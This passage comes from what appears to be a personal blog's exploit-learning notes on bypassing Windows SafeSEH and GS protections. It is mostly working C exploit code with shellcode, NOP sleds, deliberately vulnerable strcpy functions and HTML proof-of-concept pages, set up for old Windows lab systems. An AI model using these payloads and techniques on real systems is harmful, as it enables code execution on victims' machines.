\u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xE0\\xFF\\x12\\x90\u0026#34; \u0026#34;\\x08\\x3E\\x39\\x00\u0026#34; // address of shellcode in heap ; ; void test(char * input) { char str[200]; strcpy(str, input); int zero = 0; zero = 1 / zero; } void main() { char* buf = (char *)malloc(500); strcpy(buf, shellcode); test(overflowcode); } Description Put shellcode into the heap area Stack overflow, overwriting the SEH chain address to the shellcode address in the heap area Call SEH and subsequently trigger shellcode automatically Note: pay attention to the 0 case, string copy is encountering 0 cutoff\nBypass SafeSEH by using a module that is not SafeSEH enabled Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 // SEH_NOSafeSEH_JUMP.DLL # include \u0026lt;windows.h\u0026gt; BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { return TRUE; } void jump() { __asm { pop eax pop eax retn } } // SEH_NOSafeSEH.EXE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xEB\\x0E\\x90\\x90\u0026#34; // 220 Byte NOP, retn here, jmp to shellcode \u0026#34;\\x81\\x11\\x12\\x11\u0026#34; // address of pop pop retn in No_SafeSEH module \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // to prevent SEH chain stack overfill // shellocode \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; ; DWORD MyException(void) { printf(\u0026#34;There is an exception\u0026#34;); getchar(); return 1; } void test(char* input) { char str[200]; strcpy(str, input); int zero = 0; // prevent overfill, palce it to strcpy back __try { zero = 1 / zero; } __except(MyException()){} } int main() { HINSTANCE hInst = LoadLibrary(TEXT(\u0026#34;SEH_NOSafeSEH_JUMP.dll\u0026#34;)); // load No_SafeSEH module char str[200]; test(shellcode); return 0; } Experimental ideas Use VC6 to compile SEH_NOSafeSEH_JUMP.DLL, so that SEH_NOSafeSEH_JUMP.DLL will not enable SafeSEH, using release mode Use VS2008 to compile SEH_NOSafeSEH.EXE, so that SEH_NOSafeSEH.EXE will be SafeSEH enabled, using release mode, and compile with no optimization settings. The test function of SEH_NOSafeSEH.EXE has an obvious stack overflow vulnerability, which also requires that there be no zeros in the shellcode SEH is overwritten to create a divide by 0 exception, hijacking the exception handling process Advance processing Since the default loading base address of the DLL compiled by VC++ 6.0 is 0x10000000, if it is used as the loading base address of the DLL, the address of the pop pop retn instruction in the DLL may contain 0x00, which will truncate the string when we do strcpy operation and affect the copy of our shellcode, so in order to To facilitate the test we need to reset the base address. Select \u0026ldquo;Project → Settings\u0026rdquo; in the top menu, then switch to the \u0026ldquo;Connections\u0026rdquo; tab and add /base:\u0026quot; 0x11120000\u0026quot; in the \u0026ldquo;Project Options\u0026rdquo; input box. Problems encountered The springboard will jump to the first 4 bytes of the address in the shellcode, so you should put jmp here The program compiled by VS 2008 will press -2 (-1 under VC++ 6.0) at Security Cookie+4 when it enters the function containing __try{}, and the program will press -2 (-1 under VC++ 6.0) when it enters the __try{} area according to the __try{} block is modified to a different value depending on the position of the __try{} block in the function. For example, if there are two __try{} blocks in the function, this value will be modified to 0 when entering the first __try{} block, and to 1 when entering the second. If an exception occurs in the __try{} block, the program will call the corresponding __except() to handle it based on this value, and the value in this position will be modified to -2 again after the process is finished; if no exception occurs in the __try{} block, the value will also be modified back to -2 when the program leaves the __try{} block. 2. Of course there are other uses for this value in exception handling. We just need to know that our shellcode may be corrupted due to its presence, so we should put eight bytes of NOP` after the module address as a protection measure. There is a four-byte discordance between retn back to the stack address space and the shellcode body, so we need to jump to the shellcode and execute Bypass SafeSEH by using addresses other than the loaded module SafeSEH is enabled by default for all modules\nSpringboard Address Disassembly code call/jmpdword ptr[esp+0x8] call/jmpdword ptr[esp+0x14] call/jmpdword ptr[esp+0x1c] call/jmpdword ptr[esp+0x2c] call/jmpdword ptr[esp+0x44] call/jmpdword ptr[esp+0x50] call/jmp dword ptr[ebp+0xc] call/jmp dword ptr[ebp+0x24] call/jmp dword ptr[ebp+0x30] call/jmp dword ptr[ebp-0x4] call/jmp dword ptr[ebp-0xc] call/jmp dword ptr[ebp-0x18] Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = // shellcode start \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; // shellcode end \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // will be overfile with 00000000 00000000 by {__try __catch} \u0026#34;\\xE9\\x2B\\xFF\\xFF\\xFF\\x90\\x90\\x90\u0026#34; // far jump and nop \u0026#34;\\xEB\\xF6\\x90\\x90\u0026#34; // short jump and nop \u0026amp; return here \u0026#34;\\x0B\\x0B\\x29\\x00\u0026#34; // address of call [ebp+30] in outside memory ; DWORD MyException(void) { printf(\u0026#34;There is an exception\u0026#34;); getchar(); return 1; } void test(char* input) { char str[200]; strcpy(str, input); int zero = 0; __try { zero = 1 / zero; } __except(MyException()){} } int main() { test(shellcode); return 0; } Vulnerability Execution Flow Buffer overflow overrides SEH chain to handle addresses outside the module to bypass SafeSEH A call [ebp+0x30] instruction is found at 0x00290B0B, which is used as a springboard to jump into the shellcode Problems faced by ####\n0x00290B0B contains byte 0x00, strcpy copy will terminate when it encounters it Solution: 00 can not be missing, let it become the end of shellcode\nThe same problem as in the previous section, the program compiled by VS 2008, when entering the function containing __try{} will be pressed into -2 at the location of Security Cookie+4, it will destroy the shellcode, so we need to skip it, it will overwrite the location code written in, so We need to use the 12 bytes below it to jump to the entrance of the real shellcode, so we need to use two jumps to jump to the entrance, the first jump is to jump to the long jump, and the second long jump is to jump to the shellcode Using Adobe Flash Player ActiveX control to bypass SafeSEH Principle Actually this method is to bypass SafeSEH by using the browser version of the SafeSEH module which is not enabled. Flash Player ActiveX does not support SafeSEH in versions before 9.0.124, so if we can find a suitable springboard address in this control, we can bypass SafeSEH completely.\nFlash plugin as a module to find the springboard, because it does not have SafeSEH enabled We construct code modules that cause stack overflow vulnerabilities Constructing a POC html page to call the vulnerable code we constructed After our code module overflows and overwrites the SEH chain, it will jump to the Flash code springboard we have prepared The shellcode from the Flash code springboard jumps into our stack area The exploit is successful code Download IE7-for-XP-x86-Chinese installer Download the Flash Player ActiveX v9.0.124 installer Create an MFC ActiveX control, I packaged a copy of the project I created here download Detailed setup diagram Use Unicode character set, disable compile optimization option, use MFC in static library, compile with release version 1 2 3 4 5 6 7 8 void CVulnerAX_SEHCtrl::test(LPCTSTR str) { //AFX_MANAGE_STATE(AfxGetStaticModuleState()); // TODO: 在此添加调度处理程序代码 printf(\u0026#34;moeomu\u0026#34;); //定位该函数的标记 char dest[100]; sprintf(dest, \u0026#34;%s\u0026#34;, str); } UUID of CVulnerAX_SEHCtrl's class information in VulnerAX_SEH.idl: ACA3927C-6BD1-4B4E-8697-72481279AAEC Other steps Register the control: Regsvr32 path \\ control name.ocx Once registered we can call our function from the web page in the following way 1 2 3 4 5 6 \u0026lt;object classid=\u0026#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC\u0026#34; id=\u0026#34;test\u0026#34;\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;script\u0026gt; test.test(\u0026#34;testest\u0026#34;); \u0026lt;/script\u0026gt; Trigger vulnerability Constructing POC pages 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;object classid=\u0026#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\u0026#34; codebase=\u0026#34;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0\u0026#34; width=\u0026#34;160\u0026#34; height=\u0026#34;260\u0026#34;\u0026gt; \u0026lt;param name=\u0026#34;movie\u0026#34; value=\u0026#34;1.swf\u0026#34; /\u0026gt; \u0026lt;param name=\u0026#34;quality\u0026#34; value=\u0026#34;high\u0026#34; /\u0026gt; \u0026lt;embed src=\u0026#34;1.swf\u0026#34; quality=\u0026#34;high\u0026#34; pluginspage=\u0026#34;http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash\u0026#34; type=\u0026#34;application/x-shockwave-flash\u0026#34; width=\u0026#34;160\u0026#34; height=\u0026#34;260\u0026#34;\u0026gt; \u0026lt;/embed\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;object classid=\u0026#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC\u0026#34; id=\u0026#34;test\u0026#34;\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;script\u0026gt; var shellcode = \u0026#34;\u0026#34;; var s = \u0026#34;\\u9090\u0026#34;; while (s.length \u0026lt; 54) { s += \u0026#34;\\u9090\u0026#34;; } s += \u0026#34;\\u3001\\u3008\u0026#34;; s += shellcode; test.test(s); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Analysis As shown in the figure, the address 0x01DCF4FC pointed by ecx is the starting address of the overflow string, and the closest exception function address to the top of the stack is located at 0x01DCF610, which is calculated to fill 0x114 which is 276 bytes to cover the exception handling function address, and the 277th-280th bytes can be placed in the springboard Using the OllyFindAddr plugin\u0026rsquo;s Overflow return address-\u0026gt;Find CALL/JMP[EBP+N] option to find the instruction, this experiment found the CALL [EBP+0xC] of 0x300B2D1C as a springboard, as shown in the figure According to the previous calculation put the springboard address into the shellcode corresponding location, save the POC page, test change the function as follows 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; var s = \u0026#34;\\u9090\u0026#34;; while (s.length \u0026lt; 138) { s += \u0026#34;\\u9090\u0026#34;; } s += \u0026#34;\\u2D1C\\u300B\u0026#34;; test.test(s); \u0026lt;/script\u0026gt; It is said in the book that at this time the trigger except 0 exception will be transferred to the shellcode springboard, but it seems that the operation is not written in advance, so again compile the plug-in, in the test function to add except 0 operation At this point, the successful break at the springboard, the EBP register value is 0x01DCF150, according to the springboard instructions will jump to the springboard address before the 4 bytes, where you can add a jump, and shellcode to the back, as follows 1 2 3 4 5 6 01DCF60C /EB 06 jmp short 01DCF614\t; jump 01DCF60E |90 nop 01DCF60F |90 nop 01DCF610 |1C 2D sbb al,0x2D\t; addr 01DCF612 |0B30 or esi,dword ptr ds:[eax]\t; addr 01DCF614 \\90 nop\t; shellcode payload start The final test function is shown below 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script\u0026gt; var s = \u0026#34;\\u9090\u0026#34;; while (s.length \u0026lt; 136) { s += \u0026#34;\\u9090\u0026#34;; } s += \u0026#34;\\u06EB\\u9090\u0026#34;; s += \u0026#34;\\u2D1C\\u300B\u0026#34;; s += \u0026#34;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u616B\\u6F6F\\u4D68\\u7369\\u8B61\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857\u0026#34;; test.test(s); \u0026lt;/script\u0026gt; Successfully executed as shown ","date":"2020-11-12T09:40:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/","title":"Exploit learning notes 013 SafeSEH Introduction and Simple Attacks"},{"content":"Source: Moeomu\u0026rsquo;s blog\nGS Secure Compilation Protection Principle Introduction After Vistual Studio 2003 (VS 7.0), this compilation option is enabled by default Location: Project -\u0026gt; project Properties -\u0026gt; Configuration Properties -\u0026gt; C/C++ -\u0026gt; Code Generaion -\u0026gt; Buffer Security Check GS presses an additional random DWORD into the stack frame when all function calls occur, this random number is called canary, this random number is Security Cookie Security Cookie is located before EBP, the system will also store a copy of Security Cookie in the .data memory area When an overflow occurs in the stack, Security Cookie will be flooded first, followed by the EBP and the return address Before the function returns, the system will perform an additional security verification operation called Security Check. In the security check, the system will compare the value of Security Cookie originally stored in the stack frame with the value in the copy of .data, if the two do not match, it means that Security Cookie has been destroyed and the stack has overflowed When an overflow is detected, the system will enter the exception handling process, the function will not return normally, and the ret instruction will not be executed. The cost of extra operations and data is a drop in system performance, so GS will not be applied in the following cases. the function does not contain a buffer the function is defined to have a variable argument list the function uses unprotected keyword tags the function contains embedded assembly code in the first statement the buffer is not of type 8 bytes and is not larger than 4 bytes Due to these exceptions, there are still problems, SoEasy VS2005 SP1 introduced a new security marker: #pragma strict_gs_check, which can heap any function to add a security cookie to ensure security Variable reordering. According to the type of local variables heap variables in the stack frame to adjust the position of the string moved to the high address of the stack frame to prevent the string overflow when the destruction of other local variables Also assigns pointer and string parameters to low addresses in memory Security Cookie details The first double word of the .data section is used as the seed of the cookie, or raw cookie (all functions\u0026rsquo; Cooike are generated with this DWORD) Cookie seed is different for each run After the initialization of the stack frame, the system uses the ESP iso or seed as the cookie of the current function as a difference between different functions to increase the randomness of the cookie The seed of the cookie is restored by ESP before the function returns The problem of `Security Cookie Attacks based on rewriting function pointers are difficult to defend Attacks against exception handling mechanism are difficult to defend against GS GS is a protection for stack frames, hard to defend against heap overflow attacks Use unprotected memory to break GS Test environment.\nVisual Studio 2008 Professional Windows XP SP3 Test code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;string.h\u0026gt; #include \u0026lt;tchar.h\u0026gt; int vulfuction(char* str) { char arry[4]; strcpy(arry, str); return 1; } int _tmain(int argc, _TCHAR* argv[]) { char* str = \u0026#34;yeah, the function is without GS\u0026#34;; vulfuction(str); return 0; } In theory, valfunction does not contain more than 4 bytes of buffer, so the stack space of this function should be unprotected, but the actual test is protected, this problem is to be solved\nBreak GS with dummy function Only the function checks the stack when it returns, so the process can be hijacked before the function returns\nCode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include\u0026#34;string.h\u0026#34; class GSVirtual { public: void gsv(char * src) { char buf[200]; strcpy(buf, src); vir(); } virtual void vir(){} }; int main() { GSVirtual test; test.gsv( \u0026#34;\\x72\\x7A\\x81\\x7C\u0026#34; //address of \u0026#34;pop pop ret\u0026#34; \u0026#34;\\x1A\\x20\\x90\\x90\\x90\\x90\\x90\\x90\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\u0026#34; \u0026#34;\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\u0026#34; \u0026#34;\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\u0026#34; \u0026#34;\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\u0026#34; \u0026#34;\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\u0026#34; \u0026#34;\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\u0026#34; \u0026#34;\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\u0026#34; \u0026#34;\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\u0026#34; \u0026#34;\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\u0026#34; \u0026#34;\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\u0026#34; \u0026#34;\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; ); return 0; } Description Note: The test environment is Windows XP SP3, the compiled version is Release version, the compiler is Visual Studio 2008, and the compilation option is Disable compilation optimization/0d. The first four bytes of shellcode are the address of the following assembly code, if the system is not Windows XP SP3, you need to modify 1 2 3 pop edi pop esi retn Override the C++ virtual table pointer to make it point to the springboard, and if you need to balance the stack, look for an instruction in the system dynamic link library as a springboard to jump into the shellcode. If the return address is a garbage instruction, make it not affect the execution of shellcode as much as possible, here 0x817C is a cmp instruction, then this assembly instruction try to make it not occur data access exception This shellcode will pop up a window Using SEH to break GS GS does not protect SEH, so you can overwrite SEH to achieve hijacking\nCode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include\u0026lt;stdafx.h\u0026gt; #include\u0026lt;string.h\u0026gt; char shellcode[] = \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;......\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xA0\\xFE\\x12\\x00\u0026#34;//address of shellcode; void test(char * input) { char buf[200]; strcpy(buf,input); strcat(buf,input); } void main() { test(shellcode); } Description There is a stack overflow vulnerability in the function test, the variable input will be overwritten after strcpy, and strcat will get an illegal address, the function ah will go to the SEH processing process, we can hijack the system process before security_cookie check\nNote: The test environment is Windows 2000 SP4, the compiled version is Release version, the compiler is Visual Studio 2005, and the compilation option is Disable compilation optimization/0d. The reason for using Windows 2000 is to prevent the effect of SafeSEH. To be completed: Page:277 Positive hard GS (replaces the original cookie in .data) Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include\u0026lt;string.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; char Shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\u0026#34;//new value of cookie in .data \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xF4\\x6F\\x82\\x90\u0026#34; // result of \\x90\\x90\\x90\\x90 xor EBP \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // Nop Code \u0026#34;\\x94\\xFE\\x12\\x00\u0026#34; // address of Shellcode ; void test(char * s, int i, char * src) 